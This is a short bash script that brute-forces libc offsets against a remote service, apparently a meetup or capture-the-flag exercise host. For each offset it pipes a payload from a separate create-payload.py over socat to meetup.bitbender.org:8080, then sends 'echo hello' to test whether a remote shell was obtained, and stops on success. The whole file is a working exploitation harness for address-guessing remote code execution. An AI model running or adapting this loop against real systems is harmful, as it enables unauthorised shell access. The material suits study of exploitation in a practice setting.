#!/usr/bin/env bash

# Run a test over a range of libc offsets.
# Stop when get success or run out of libc offsets.
# Assume offset mod 16 = 0.

[[ $# != 1 && $# != 2 ]] && { echo "Usage: $0 START [STOP]"; exit; }
START=$1
STOP=$START
[[ $# == 2 ]] && STOP=$2
[[ $1 -gt $2 ]] && { echo "START $1 is not less than STOP $2"; exit; }

REMHOST=meetup.bitbender.org
PORT=8080

for (( s=$START; s<=$STOP; s=$((s + 16)) )); do
  printf -v offset "0x%x" $s
  echo Testing $offset
  result=$( (./create-payload.py $offset ; sleep 5; echo "echo hello; echo exit;" ) | \
               socat - tcp4:$REMHOST:$PORT)
  [[ "$result" =~ hello ]] && { echo success at $offset; exit; }
  sleep 25
done
